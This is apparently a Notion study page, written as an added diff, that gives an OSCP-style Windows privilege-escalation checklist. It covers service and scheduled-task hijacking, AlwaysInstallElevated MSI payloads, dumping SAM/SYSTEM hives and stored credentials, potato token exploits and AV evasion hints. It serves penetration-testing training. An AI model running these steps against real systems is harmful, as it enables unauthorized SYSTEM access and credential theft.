@@ -1,0 +1,313 @@
+
+> <b>Purpose:</b> take a Windows shell to SYSTEM/Administrator by checking services, token privileges, install policies and stored credentials — in that order, with automated scanners only after the manual pass.
+
+## Why manual first
+
+winPEAS and PrivescCheck produce hundreds of lines of "possible" findings. The exam scores a <b>decision</b>, not a scan. Manual checks (15-20 minutes) find the intended path; the scanners catch what you missed.
+
+<b>Order:</b> identity → services → tasks → install policy → credentials → tokens → registry → scanner → kernel.
+
+## A. Identity and privileges
+
+### Step 01 — Who am I, and what can I do?
+
+<b>Priority:</b> Core · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```shen
+whoami
+whoami /priv
+whoami /groups
+whoami /all
+```
+
+<b>Look for:</b> <code>SeImpersonatePrivilege</code>, <code>SeAssignPrimaryTokenPrivilege</code>, <code>SeBackupPrivilege</code>, <code>SeRestorePrivilege</code>, <code>SeTakeOwnershipPrivilege</code>, and membership of <code>Administrators</code>, <code>Backup Operators</code>.<br /><b>Decision:</b> <code>SeImpersonate</code> enabled → Section F (potato). <code>SeBackup</code> → dump SAM/SYSTEM. Admin group but unelevated (UAC) → try <code>runas</code>/UAC bypass only if the token allows.<br /><b>Next:</b> Step 02.<br /><b>Common mistake:</b> stopping at <code>whoami</code>. The <b>privileges</b> list is the single highest-value output on Windows.<br /><b>Evidence:</b> the <code>whoami /priv</code> block.
+
+### Step 02 — System and patch level
+
+<b>Priority:</b> Core · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```shen
+systeminfo
+wmic qfe get Caption,HotFixID,InstalledOn
+```
+
+<b>Look for:</b> OS build, architecture, hotfix list, install date.<br /><b>Decision:</b> an old build missing a specific patch → Section I. A modern build → configuration/credential paths, not kernel exploits.<br /><b>Next:</b> Step 03.<br /><b>Common mistake:</b> using <code>systeminfo</code> alone to claim "unpatched". Compare the <b>build number</b> with the advisory's fixed build.<br /><b>Evidence:</b> OS name, build, and the hotfix list.
+
+### Step 03 — Local users and administrators
+
+<b>Priority:</b> Core · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```shen
+net user
+net localgroup administrators
+net localgroup "Remote Desktop Users"
+```
+
+<b>Look for:</b> non-standard accounts, a service account in Administrators, guest enabled.<br /><b>Decision:</b> a service account with a weak password → credential path. No second admin account → focus on privilege escalation, not lateral movement.<br /><b>Next:</b> Section B.<br /><b>Common mistake:</b> assuming an account called <code>svc_backup</code> is unprivileged. Check its groups.<br /><b>Evidence:</b> the group listing.
+
+## B. Services
+
+### Step 04 — Enumerate services and their binaries
+
+<b>Priority:</b> Core · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```shen
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\"
+sc query state= all
+```
+
+<b>Look for:</b> auto-start services whose binary path is <b>unquoted and contains spaces</b>, or lives in a user-writable directory.<br /><b>Decision:</b> unquoted path with spaces → Step 05. Writable binary/directory → Step 06.<br /><b>Next:</b> Step 05.<br /><b>Common mistake:</b> only looking at running services. Stopped auto-start services are equally exploitable and less noticed.<br /><b>Evidence:</b> the service name and its exact <code>PathName</code>.
+
+### Step 05 — Unquoted service path
+
+<b>Priority:</b> Core · <b>Run on:</b> target · <b>Status:</b> Documented
+
+```shen
+sc qc <SERVICE_NAME>
+icacls "C:\Program Files\Vulnerable App"
+```
+
+<b>Look for:</b> <code>BINARY_PATH_NAME : C:\Program Files\Vulnerable App\service.exe</code> — no quotes, spaces in the path.<br /><b>Decision:</b> you can write to <code>C:\Program.exe</code> or <code>C:\Program Files\Vulnerable.exe</code> → drop a payload there, then restart the service. No write access → dead end.<br /><b>Next:</b> Step 07 (payload) then <code>sc stop/start</code>.<br /><b>Common mistake:</b> testing writability by trying to create the file. Use <code>icacls</code> first, and clean up anything you create.<br /><b>Evidence:</b> the service config plus the writable directory.
+
+### Step 06 — Replace a service binary
+
+<b>Priority:</b> Conditional · <b>Run on:</b> target · <b>Status:</b> Documented
+
+```shen
+icacls "C:\Path\To\service.exe"
+sc config <SERVICE_NAME> binpath= "C:\temp\shell.exe"
+sc stop <SERVICE_NAME>
+sc start <SERVICE_NAME>
+```
+
+<b>Look for:</b> <code>(F)</code> or <code>(M)</code> for your user on the binary or its directory, or <code>SERVICE_CHANGE_CONFIG</code> rights.<br /><b>Decision:</b> can change the path → point it at your payload. Can only overwrite the file → back it up first.<br /><b>Next:</b> the service starts as SYSTEM and runs your payload.<br /><b>Common mistake:</b> not restoring the original binary. A broken service can break the box for later steps.<br /><b>Evidence:</b> before/after <code>sc qc</code>, and the shell.
+
+### Step 07 — Service permissions audit
+
+<b>Priority:</b> Conditional · <b>Run on:</b> target · <b>Status:</b> Documented
+
+```shen
+accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+accesschk.exe /accepteula -uwcqv "Users" *
+```
+
+<b>Look for:</b> <code>SERVICE_ALL_ACCESS</code>, <code>SERVICE_CHANGE_CONFIG</code>, <code>SERVICE_START</code> on a service running as SYSTEM.<br /><b>Decision:</b> <code>CHANGE_CONFIG</code> → Step 06. <code>SERVICE_STOP/START</code> only → hijack the binary path indirectly.<br /><b>Next:</b> Step 06.<br /><b>Common mistake:</b> running accesschk without <code>/accepteula</code> in a non-interactive shell — it hangs on the EULA prompt.<br /><b>Evidence:</b> the permission line for the service.
+
+## C. Scheduled tasks
+
+### Step 08 — Enumerate tasks and their files
+
+<b>Priority:</b> Core · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```shen
+schtasks /query /fo LIST /v
+schtasks /query /fo LIST /v | findstr /i "TaskName Run As"
+```
+
+<b>Look for:</b> tasks running as SYSTEM/Administrator that execute a script in a writable location.<br /><b>Decision:</b> writable script → replace it (back it up). Task file writable but not the action → check the task's XML permissions.<br /><b>Next:</b> wait for the trigger, or <code>schtasks /run /tn "<TASK>"</code>.<br /><b>Common mistake:</b> assuming all tasks run as SYSTEM. Read the "Run As User" line.<br /><b>Evidence:</b> the task name, action path, and run-as user.
+
+## D. Install policy
+
+### Step 09 — AlwaysInstallElevated
+
+<b>Priority:</b> Core · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```shen
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+<b>Look for:</b> <b>both</b> values <code>0x1</code>.<br /><b>Decision:</b> both set → Step 10. Only one set → not exploitable; move on.<br /><b>Next:</b> Step 10.<br /><b>Common mistake:</b> seeing <code>0x1</code> in one hive and declaring victory. The policy requires <b>both</b> HKLM and HKCU.<br /><b>Evidence:</b> both registry outputs.
+
+### Step 10 — MSI payload
+
+<b>Priority:</b> Conditional · <b>Run on:</b> target · <b>Status:</b> Documented
+
+```shen
+msiexec /quiet /qn /i C:\temp\shell.msi
+```
+
+<b>Look for:</b> a SYSTEM shell on your listener.<br /><b>Decision:</b> no callback → check the MSI architecture (x86 vs x64) and your listener.<br /><b>Next:</b> proof.<br /><b>Common mistake:</b> building the MSI on the target with a tool that is not present. Generate it on Kali and transfer it.<br /><b>Evidence:</b> the registry state, the MSI command, and the resulting shell.
+
+## E. Credentials on the box
+
+### Step 11 — Stored credentials and common files
+
+<b>Priority:</b> Core · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```shen
+cmdkey /list
+dir C:\Users\*\AppData\Roaming\Microsoft\Credentials 2>nul
+type C:\Windows\Panther\unattend.xml 2>nul
+type C:\Windows\System32\sysprep\sysprep.inf 2>nul
+reg query HKLM\SOFTWARE\<VENDOR> /s /f password 2>nul
+```
+
+<b>Look for:</b> saved RDP/domain credentials in <code>cmdkey</code>, base64 passwords in <code>unattend.xml</code>, plaintext service passwords in the registry.<br /><b>Decision:</b> a credential is found → <code>runas /savecred</code> or PsExec with it. No credential → Section F.<br /><b>Next:</b> validate the credential.<br /><b>Common mistake:</b> reading <code>unattend.xml</code> and skipping the base64 decode. <code>echo <B64> | base64 -d</code> (or PowerShell) reveals the password.<br /><b>Evidence:</b> the file path and the recovered credential.
+
+### Step 12 — SAM and SYSTEM (backup privilege)
+
+<b>Priority:</b> Conditional · <b>Run on:</b> target · <b>Status:</b> Documented
+
+```shen
+reg save HKLM\SAM C:\temp\sam.hive
+reg save HKLM\SYSTEM C:\temp\system.hive
+```
+
+<b>Look for:</b> two hive files you can download (via SMB, <code>certutil</code>, or a base64 transfer).<br /><b>Decision:</b> files obtained → dump hashes offline with <code>impacket-secretsdump -sam sam.hive -system system.hive LOCAL</code>.<br /><b>Next:</b> pass-the-hash.<br /><b>Common mistake:</b> trying <code>reg save</code> without <code>SeBackupPrivilege</code> — it fails silently for a normal admin in some configurations.<br /><b>Evidence:</b> the hive files and the recovered hashes.
+
+## F. Token impersonation
+
+### Step 13 — Confirm the privilege
+
+<b>Priority:</b> Core · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```shen
+whoami /priv | findstr /i "Impersonate AssignPrimaryToken"
+```
+
+<b>Look for:</b> <code>SeImpersonatePrivilege</code> <b>Enabled</b>.<br /><b>Decision:</b> enabled → Step 14. Present but disabled → try to enable it, or find a service that impersonates for you.<br /><b>Next:</b> Step 14.<br /><b>Common mistake:</b> confusing <code>Enabled</code> with <code>Disabled</code> in the output. The state column matters.<br /><b>Evidence:</b> the privilege line.
+
+### Step 14 — Potato-family exploit
+
+<b>Priority:</b> Core · <b>Run on:</b> target · <b>Status:</b> Documented
+
+```shen
+PrintSpoofer.exe -i -c "cmd /c whoami"
+GodPotato.exe -cmd "cmd /c whoami"
+```
+
+<b>Look for:</b> <code>nt authority\system</code>.<br /><b>Decision:</b> the exploit fails → the OS build may have patched that specific technique (PrintSpoofer for older builds, GodPotato/RoguePotato for newer). Try the variant that matches the build.<br /><b>Next:</b> get a SYSTEM shell.<br /><b>Common mistake:</b> running a potato exploit on a build that patched it and concluding "SeImpersonate is useless". Try a different family member.<br /><b>Evidence:</b> <code>whoami</code> returning SYSTEM.
+
+## G. Registry and permissions
+
+### Step 15 — Registry key permissions
+
+<b>Priority:</b> Conditional · <b>Run on:</b> target · <b>Status:</b> Documented
+
+```powershell
+Get-Acl HKLM:\SOFTWARE\<VENDOR> | Format-List
+Get-Acl HKLM:\SYSTEM\CurrentControlSet\Services\<SERVICE> | Format-List
+```
+
+<b>Look for:</b> <code>FullControl</code> or <code>SetValue</code> granted to <code>Users</code>/<code>Authenticated Users</code> on a key that a privileged process reads.<br /><b>Decision:</b> writable key used by a service → change its <code>ImagePath</code> or configuration to point at your payload.<br /><b>Next:</b> restart the service.<br /><b>Common mistake:</b> picking a key nobody reads. Find the key that the vulnerable service actually consumes.<br /><b>Evidence:</b> the ACL and the value you changed.
+
+## H. Network and listening services
+
+### Step 16 — Local-only services
+
+<b>Priority:</b> Core · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```shen
+netstat -ano
+tasklist /svc
+```
+
+<b>Look for:</b> listeners on <code>127.0.0.1</code> with a PID, especially on high ports.<br /><b>Decision:</b> an admin service bound to [localhost](http://localhost) → tunnel to it (portproxy or SSH) and attack it as root.<br /><b>Next:</b> pivot to the service.<br /><b>Common mistake:</b> ignoring [localhost](http://localhost) listeners because "there is nothing remote". They are often the intended privesc path.<br /><b>Evidence:</b> the <code>netstat</code> line with PID and the matching process.
+
+## I. Automated enumeration
+
+### Step 17 — winPEAS
+
+<b>Priority:</b> Conditional · <b>Run on:</b> target · <b>Status:</b> Syntax Checked
+
+```shen
+.\winPEASx64.exe
+```
+
+<b>Look for:</b> red "known vulnerability" blocks, service misconfigurations, credentials, AlwaysInstallElevated.<br /><b>Decision:</b> each red block still needs manual confirmation (Sections B-G).<br /><b>Next:</b> verify the top finding by hand.<br /><b>Common mistake:</b> pasting winPEAS output as a finding. The report needs the exploit you ran and its output.<br /><b>Evidence:</b> the scan output as an appendix.
+
+### Step 18 — PrivescCheck
+
+<b>Priority:</b> Conditional · <b>Run on:</b> target · <b>Status:</b> Documented
+
+```powershell
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
+```
+
+<b>Look for:</b> a structured list of findings with severity, plus registry and policy checks winPEAS sometimes buries.<br /><b>Decision:</b> cross-reference with the manual pass; PrivescCheck is quieter and more readable in a report.<br /><b>Next:</b> exploit the confirmed finding.<br /><b>Common mistake:</b> running it without <code>-Extended</code> and missing policy checks.<br /><b>Evidence:</b> the exported report.
+
+## J. Kernel exploits
+
+### Step 19 — Match build to advisory
+
+<b>Priority:</b> Advanced · <b>Run on:</b> target · <b>Status:</b> Documented
+
+```shen
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+```
+
+<b>Look for:</b> a build number matching a local privilege-escalation CVE.<br /><b>Decision:</b> a match exists → read the exploit, confirm the architecture, and accept the crash risk. On the exam, prefer a configuration flaw.<br /><b>Next:</b> run only if a revert is acceptable.<br /><b>Common mistake:</b> running MS16-032/MS17-010-style exploits on a patched build and hanging the box.<br /><b>Evidence:</b> build number, exploit name, and the reason it applies.
+
+## K. Decision tree: manual to automated
+
+| What you found | Do this | Do <b>not</b> |
+| --- | --- | --- |
+| <code>SeImpersonate</code> enabled | Potato family (Step 14) | Ignore it and run winPEAS |
+| Unquoted service path + writable dir | Plant binary, restart service (Step 05) | Overwrite the existing binary |
+| Service with weak config rights | <code>sc config</code> to your payload (Step 06) | Restart blindly without a backup |
+| Writable scheduled-task script | Replace payload (Step 08) | Wait a day for the trigger — run the task |
+| AlwaysInstallElevated = 1/1 | MSI payload (Step 10) | Assume one hive is enough |
+| Saved credentials in cmdkey | <code>runas /savecred</code> (Step 11) | Crack what is already usable |
+| SeBackupPrivilege | Dump SAM/SYSTEM (Step 12) | Try to read the hives directly |
+| Writable registry key | Repoint the service (Step 15) | Guess which key is used |
+| [Localhost](http://Localhost)-only service | Tunnel and attack it (Step 16) | Declare "no privesc" |
+| <b>Nothing after 20-30 min</b> | winPEAS (Step 17) | Repeat the same checks |
+| winPEAS noisy | PrivescCheck (Step 18) | Run kernel exploits blindly |
+| Build matches a CVE | Decide, then run (Step 19) | Crash the box on a hunch |
+
+<b>Hard rule:</b> if you are 45 minutes in with no vector, revert and re-read your own enumeration. A fresh pass beats a fourth scanner.
+
+## L. Troubleshooting
+
+| Symptom | Cause | Fix |
+| --- | --- | --- |
+| <code>accesschk</code> hangs | EULA prompt | Add <code>/accepteula</code> |
+| <code>sc</code> syntax error | Missing space after <code>=</code> | <code>binpath= "C:\path"</code> — the space is required |
+| Potato exploit returns nothing | Technique patched on this build | Try another family member or another path |
+| MSI installs but no callback | Architecture mismatch / listener | Rebuild for the target arch; check <code>LPORT</code> |
+| <code>reg save</code> access denied | No SeBackupPrivilege | Use another credential path |
+| Payload deleted by AV | Defender active | Try an obfuscated/encoded payload, or a different vector |
+| Shell dies instantly | Payload exits | Use a staged/looping payload; catch again |
+| RDP/PsExec fails but SMB works | Firewall on 3389/445 | Use WinRM (5985) or SMB-based exec |
+
+<b>Pivoting variant.</b> If the Windows host can only reach an internal pivot, a reverse shell to Kali will not connect. Forward a port from the pivot (<code>ssh -L</code>) and catch the shell there, or use a bind shell reached through <code>proxychains4</code>. Impacket through a pivot: <code>proxychains4 impacket-wmiexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP></code>.
+
+## M. Quick workflow
+
+1. <code>whoami /priv</code> + <code>whoami /groups</code>.
+2. <code>systeminfo</code> + <code>wmic qfe</code>.
+3. Services: unquoted paths, writable binaries, <code>accesschk</code>.
+4. Scheduled tasks and their scripts.
+5. <code>AlwaysInstallElevated</code> both hives.
+6. <code>cmdkey /list</code>, unattend/sysprep, registry passwords.
+7. <code>SeImpersonate</code> → potato.
+8. Registry ACLs, [localhost](http://localhost) services.
+9. winPEAS → PrivescCheck.
+10. Kernel exploit last.
+
+## N. Evidence to preserve
+
+- <code>whoami /priv</code> (the privilege that justified the path).
+- <code>sc qc</code> output or the ACL that showed the misconfiguration.
+- The exact command that produced SYSTEM, and <code>whoami</code> afterwards.
+- <code>type C:\Users\Administrator\Desktop\proof.txt</code> plus <code>ipconfig</code> in one screenshot.
+- Any service you modified — note whether you restored it.
+
+## O. Related pages
+
+- [Linux Privilege Escalation — Complete Command Reference](https://app.notion.com/p/4011e51238b58177854fcfe83c31ef5d)
+- [Post-Exploitation & Lateral Movement — NetExec and Impacket](https://app.notion.com/p/4011e51238b58119b91aee453db12b4c)
+- <mention url="https://app.notion.com/p/4011e51238b581bbadcbe10d66d5ce31" /> — shares that leak credentials
+- OSCP Attack Workflow — Start Here
+
+## P. References
+
+- HackTricks Windows privilege escalation: [https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/)
+- winPEAS: [https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
+- PrivescCheck: [https://github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)
+- GTFOBins equivalent for Windows (LOLBAS): [https://lolbas-project.github.io/](https://lolbas-project.github.io/)
+
+## Q. Verification note
+
+Windows command syntax was checked against documented <code>cmd</code>, <code>sc</code>, <code>reg</code> and PowerShell usage; <code>winPEASx64.exe</code>, <code>PrivescCheck.ps1</code>, <code>PrintSpoofer</code> and <code>GodPotato</code> are not installed on this Kali host, so those steps are <b>Documented</b>. Nothing was executed against a live Windows target, so no step is <b>Lab Tested</b>.
